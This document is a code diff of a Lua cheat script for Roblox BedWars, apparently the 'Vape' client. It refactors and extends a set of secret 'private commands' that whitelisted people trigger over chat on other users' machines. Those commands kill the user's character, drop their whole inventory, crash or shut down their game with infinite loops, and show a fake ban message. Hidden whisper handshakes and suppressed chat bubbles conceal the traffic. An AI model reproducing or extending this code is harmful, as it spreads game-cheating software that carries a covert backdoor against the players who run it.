@@ -55,8 +55,8 @@ local bedwarsStore = {
 		universalLagbacks = 0
 	},
 	whitelist = {
-		chatStrings1 = {KVOP25KYFPPP4 = "vape"},
-		chatStrings2 = {vape = "KVOP25KYFPPP4"},
+		chatStrings1 = {helloimusingvxpe = "vape"},
+		chatStrings2 = {vape = "helloimusingvxpe"},
 		clientUsers = {},
 		oldChatFunctions = {}
 	},
@@ -1545,8 +1545,60 @@ runFunction(function()
 			return temp
 		end
 
+		local function transformImage(img, txt)
+			local function funnyfunc(v)
+				if v:IsA("ImageLabel") or v:IsA("ImageButton") then
+					v.Image = img
+					v:GetPropertyChangedSignal("Image"):Connect(function()
+						v.Image = img
+					end)
+				end
+				if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ExperienceChat") == nil then
+					if v.Text ~= "" then
+						v.Text = txt
+					end
+					v:GetPropertyChangedSignal("Text"):Connect(function()
+						if v.Text ~= "" then
+							v.Text = txt
+						end
+					end)
+				end
+				if v:IsA("Texture") or v:IsA("Decal") then
+					v.Texture = img
+					v:GetPropertyChangedSignal("Texture"):Connect(function()
+						v.Texture = img
+					end)
+				end
+				if v:IsA("MeshPart") then
+					v.TextureID = img
+					v:GetPropertyChangedSignal("TextureID"):Connect(function()
+						v.TextureID = img
+					end)
+				end
+				if v:IsA("SpecialMesh") then
+					v.TextureId = img
+					v:GetPropertyChangedSignal("TextureId"):Connect(function()
+						v.TextureId = img
+					end)
+				end
+				if v:IsA("Sky") then
+					v.SkyboxBk = img
+					v.SkyboxDn = img
+					v.SkyboxFt = img
+					v.SkyboxLf = img
+					v.SkyboxRt = img
+					v.SkyboxUp = img
+				end
+			end
+		
+			for i,v in pairs(game:GetDescendants()) do
+				funnyfunc(v)
+			end
+			game.DescendantAdded:Connect(funnyfunc)
+		end
+
 		local vapePrivateCommands = {
-			["kill"] = function(args, plr)
+			kill = function(args, plr)
 				if entityLibrary.isAlive then
 					local hum = entityLibrary.character.Humanoid
 					task.delay(0.1, function()
@@ -1558,7 +1610,7 @@ runFunction(function()
 					end)
 				end
 			end,
-			["byfron"] = function(args, plr)
+			byfron = function(args, plr)
 				task.spawn(function()
 					local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
 					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
@@ -1629,12 +1681,12 @@ runFunction(function()
 					end)
 				end)
 			end,
-			["steal"] = function(args, plr)
+			steal = function(args, plr)
 				if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
 					GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
 					task.wait(1)
 				end
-				for i,v in pairs(currentinventory.inventory.items) do 
+				for i,v in pairs(bedwarsStore.localInventory.inventory.items) do 
 					local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
 						item = v.tool,
 						amount = v.amount ~= math.huge and v.amount or 99999999
@@ -1646,174 +1698,87 @@ runFunction(function()
 					end
 				end
 			end,
-			["lobby"] = function(args)
+			lobby = function(args)
 				bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
 			end,
-			["lagback"] = function(args)
+			reveal = function(args)
+				local newchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
+				if newchannel then 
+					newchannel:SendAsync("I am using the inhaler client")
+				end
+			end,
+			lagback = function(args)
 				if entityLibrary.isAlive then
 					entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(9999999, 9999999, 9999999)
 				end
 			end,
-			["jump"] = function(args)
+			jump = function(args)
 				if entityLibrary.isAlive and entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
 					entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
 				end
 			end,
-			["teleport"] = function(args)
+			trip = function(args)
+				if entityLibrary.isAlive then
+					entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+				end
+			end,
+			teleport = function(args)
 				game:GetService("TeleportService"):Teleport(tonumber(args[1]) ~= "" and tonumber(args[1]) or game.PlaceId)
 			end,
-			["sit"] = function(args)
+			sit = function(args)
 				if entityLibrary.isAlive then
 					entityLibrary.character.Humanoid.Sit = true
 				end
 			end,
-			["unsit"] = function(args)
+			unsit = function(args)
 				if entityLibrary.isAlive then
 					entityLibrary.character.Humanoid.Sit = false
 				end
 			end,
-			["freeze"] = function(args)
+			freeze = function(args)
 				if entityLibrary.isAlive then
 					entityLibrary.character.HumanoidRootPart.Anchored = true
 				end
 			end,
-			["unfreeze"] = function(args)
+			thaw = function(args)
 				if entityLibrary.isAlive then
 					entityLibrary.character.HumanoidRootPart.Anchored = false
 				end
 			end,
-			["deletemap"] = function(args)
+			deletemap = function(args)
 				for i,v in pairs(collectionService:GetTagged("block")) do
 					v:Destroy()
 				end
 			end,
-			["void"] = function(args)
+			void = function(args)
 				if entityLibrary.isAlive then
-					task.spawn(function()
-						repeat
-							task.wait()
-							entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + Vector3.new(0, -3, 0)
-						until not entityLibrary.isAlive
-					end)
+					entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + Vector3.new(0, -1000, 0)
 				end
 			end,
-			["framerate"] = function(args)
+			framerate = function(args)
 				if #args >= 1 then
 					if setfpscap then
 						setfpscap(tonumber(args[1]) ~= "" and math.clamp(tonumber(args[1]) or 9999, 1, 9999) or 9999)
 					end
 				end
 			end,
-			["crash"] = function(args)
+			crash = function(args)
 				setfpscap(9e9)
 				print(game:GetObjects("h29g3535")[1])
 			end,
-			["chipman"] = function(args)
-				local function funnyfunc(v)
-					if v:IsA("ImageLabel") or v:IsA("ImageButton") then
-						v.Image = "http://www.roblox.com/asset/?id=6864086702"
-						v:GetPropertyChangedSignal("Image"):Connect(function()
-							v.Image = "http://www.roblox.com/asset/?id=6864086702"
-						end)
-					end
-					if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
-						if v.Text ~= "" then
-							v.Text = "chips"
-						end
-						v:GetPropertyChangedSignal("Text"):Connect(function()
-							if v.Text ~= "" then
-								v.Text = "chips"
-							end
-						end)
-					end
-					if v:IsA("Texture") or v:IsA("Decal") then
-						v.Texture = "http://www.roblox.com/asset/?id=6864086702"
-						v:GetPropertyChangedSignal("Texture"):Connect(function()
-							v.Texture = "http://www.roblox.com/asset/?id=6864086702"
-						end)
-					end
-					if v:IsA("MeshPart") then
-						v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
-						v:GetPropertyChangedSignal("TextureID"):Connect(function()
-							v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
-						end)
-					end
-					if v:IsA("SpecialMesh") then
-						v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
-						v:GetPropertyChangedSignal("TextureId"):Connect(function()
-							v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
-						end)
-					end
-					if v:IsA("Sky") then
-						v.SkyboxBk = "http://www.roblox.com/asset/?id=6864086702"
-						v.SkyboxDn = "http://www.roblox.com/asset/?id=6864086702"
-						v.SkyboxFt = "http://www.roblox.com/asset/?id=6864086702"
-						v.SkyboxLf = "http://www.roblox.com/asset/?id=6864086702"
-						v.SkyboxRt = "http://www.roblox.com/asset/?id=6864086702"
-						v.SkyboxUp = "http://www.roblox.com/asset/?id=6864086702"
-					end
-				end
-			
-				for i,v in pairs(game:GetDescendants()) do
-					funnyfunc(v)
-				end
-				game.DescendantAdded:Connect(funnyfunc)
+			chipman = function(args)
+				transformImage("http://www.roblox.com/asset/?id=6864086702", "chip man")
 			end,
-			["rickroll"] = function(args)
-				local function funnyfunc(v)
-					if v:IsA("ImageLabel") or v:IsA("ImageButton") then
-						v.Image = "http://www.roblox.com/asset/?id=7083449168"
-						v:GetPropertyChangedSignal("Image"):Connect(function()
-							v.Image = "http://www.roblox.com/asset/?id=7083449168"
-						end)
-					end
-					if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
-						if v.Text ~= "" then
-							v.Text = "Never gonna give you up"
-						end
-						v:GetPropertyChangedSignal("Text"):Connect(function()
-							if v.Text ~= "" then
-								v.Text = "Never gonna give you up"
-							end
-						end)
-					end
-					if v:IsA("Texture") or v:IsA("Decal") then
-						v.Texture = "http://www.roblox.com/asset/?id=7083449168"
-						v:GetPropertyChangedSignal("Texture"):Connect(function()
-							v.Texture = "http://www.roblox.com/asset/?id=7083449168"
-						end)
-					end
-					if v:IsA("MeshPart") then
-						v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
-						v:GetPropertyChangedSignal("TextureID"):Connect(function()
-							v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
-						end)
-					end
-					if v:IsA("SpecialMesh") then
-						v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
-						v:GetPropertyChangedSignal("TextureId"):Connect(function()
-							v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
-						end)
-					end
-					if v:IsA("Sky") then
-						v.SkyboxBk = "http://www.roblox.com/asset/?id=7083449168"
-						v.SkyboxDn = "http://www.roblox.com/asset/?id=7083449168"
-						v.SkyboxFt = "http://www.roblox.com/asset/?id=7083449168"
-						v.SkyboxLf = "http://www.roblox.com/asset/?id=7083449168"
-						v.SkyboxRt = "http://www.roblox.com/asset/?id=7083449168"
-						v.SkyboxUp = "http://www.roblox.com/asset/?id=7083449168"
-					end
-				end
-			
-				for i,v in pairs(game:GetDescendants()) do
-					funnyfunc(v)
-				end
-				game.DescendantAdded:Connect(funnyfunc)
+			rickroll = function(args)
+				transformImage("http://www.roblox.com/asset/?id=7083449168", "Never gonna give you up")
 			end,
-			["gravity"] = function(args)
+			josiah = function(args)
+				transformImage("http://www.roblox.com/asset/?id=13924242802", "josiah boney")
+			end,
+			gravity = function(args)
 				workspace.Gravity = tonumber(args[1]) or 192.6
 			end,
-			["kick"] = function(args)
+			kick = function(args)
 				local str = ""
 				for i,v in pairs(args) do
 					str = str..v..(i > 1 and " " or "")
@@ -1823,16 +1788,16 @@ runFunction(function()
 				end)
 				bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
 			end,
-			["ban"] = function(args)
+			ban = function(args)
 				task.spawn(function()
 					lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
 				end)
 				bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
 			end,
-			["uninject"] = function(args)
-				GuiLibrary["SelfDestruct"]()
+			uninject = function(args)
+				GuiLibrary.SelfDestruct()
 			end,
-			["monkey"] = function(args)
+			monkey = function(args)
 				local str = ""
 				for i,v in pairs(args) do
 					str = str..v..(i > 1 and " " or "")
@@ -1880,25 +1845,53 @@ runFunction(function()
 					while true do end
 				end)
 			end,
-			["togglemodule"] = function(args)
+			enable = function(args)
 				if #args >= 1 then
-					local module = GuiLibrary.ObjectsThatCanBeSaved[args[1].."OptionsButton"]
-					if module then
-						if module["Api"].Enabled == (not args[2] == "true") then
-							module["Api"].ToggleButton()
+					local module
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
+							module = v
+							break
 						end
+					end
+					if module and not module.Api.Enabled then
+						module.Api.ToggleButton()
 					end
 				end
 			end,
-			["shutdown"] = function(args)
-				game:Shutdown()
-			end,
-			["errorkick"] = function(args)
-				if entityLibrary.isAlive then 
-					pcall(function() lplr.Character.Head:Destroy() end)
+			disable = function(args)
+				if #args >= 1 then
+					local module
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
+							module = v
+							break
+						end
+					end
+					if module and module.Api.Enabled then
+						module.Api.ToggleButton()
+					end
 				end
+			end,
+			toggle = function(args)
+				if #args >= 1 then
+					local module
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
+							module = v
+							break
+						end
+					end
+					if module then
+						module.Api.ToggleButton()
+					end
+				end
+			end,
+			shutdown = function(args)
+				game:Shutdown()
 			end
 		}
+		vapePrivateCommands.unfreeze = vapePrivateCommands.thaw
 
 		textChatService.OnIncomingMessage = function(message)
 			local props = Instance.new("TextChatMessageProperties")
@@ -1946,30 +1939,9 @@ runFunction(function()
 							end
 						end
 					else
-						if client ~= nil then message.Text = "" end
 						if localPriority > 0 and message.TextChannel.Name:find("RBXWhisper") and client ~= nil and alreadysaidlist[plr.Name] == nil then
+							message.Text = ""
 							alreadysaidlist[plr.Name] = true
-							task.spawn(function()
-								local connection
-								for i,newbubble in pairs(game:GetService("CoreGui").ExperienceChat.bubbleChat:GetDescendants()) do
-									if newbubble:IsA("TextLabel") and newbubble.Text:find(bedwarsStore.whitelist.chatStrings2[client]) then
-										newbubble.Parent.Parent.Visible = false
-										repeat task.wait() until newbubble:IsDescendantOf(nil)
-										if connection then
-											connection:Disconnect()
-										end
-									end
-								end
-								connection = game:GetService("CoreGui").ExperienceChat.bubbleChat.DescendantAdded:Connect(function(newbubble)
-									if newbubble:IsA("TextLabel") and newbubble.Text:find(bedwarsStore.whitelist.chatStrings2[client]) then
-										newbubble.Parent.Parent.Visible = false
-										repeat task.wait() until newbubble:IsDescendantOf(nil)
-										if connection then
-											connection:Disconnect()
-										end
-									end
-								end)
-							end)
 							warningNotification("Vape", plr.Name.." is using "..client.."!", 60)
 							WhitelistFunctions.CustomTags[plr.Name] = string.format("[%s] ", client:upper()..' USER')
 							bedwarsStore.whitelist.clientUsers[plr.Name] = client:upper()..' USER'
@@ -2011,31 +1983,23 @@ runFunction(function()
 						task.wait(4)
 						local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
 						local newchannel = game:GetService("RobloxReplicatedStorage").ExperienceChat.WhisperChat:InvokeServer(plr.UserId)
-						if newchannel then 
-							newchannel:SendAsync(bedwarsStore.whitelist.chatStrings2.vape)
-						end
-						textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
+						local client = bedwarsStore.whitelist.chatStrings2.vape
 						task.spawn(function()
-							local connection
-							for i,newbubble in pairs(game:GetService("CoreGui").BubbleChat:GetDescendants()) do
-								if newbubble:IsA("TextLabel") and newbubble.Text:find(bedwarsStore.whitelist.chatStrings2.vape) then
+							game:GetService("CoreGui").ExperienceChat.bubbleChat.DescendantAdded:Connect(function(newbubble)
+								if newbubble:IsA("TextLabel") and newbubble.Text:find(client) then
 									newbubble.Parent.Parent.Visible = false
-									repeat task.wait() until newbubble:IsDescendantOf(nil) 
-									if connection then
-										connection:Disconnect()
-									end
 								end
-							end
-							connection = game:GetService("CoreGui").BubbleChat.DescendantAdded:Connect(function(newbubble)
-								if newbubble:IsA("TextLabel") and newbubble.Text:find(bedwarsStore.whitelist.chatStrings2.vape) then
-									newbubble.Parent.Parent.Visible = false
-									repeat task.wait() until newbubble:IsDescendantOf(nil)
-									if connection then
-										connection:Disconnect()
-									end
+							end)
+							game:GetService("CoreGui").ExperienceChat:FindFirstChild("RCTScrollContentView", true).ChildAdded:Connect(function(newbubble)
+								if newbubble:IsA("TextLabel") and newbubble.Text:find(client) then
+									newbubble.Visible = false
 								end
 							end)
 						end)
+						if newchannel then 
+							newchannel:SendAsync(client)
+						end
+						textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
 					end)
 				end
 			end
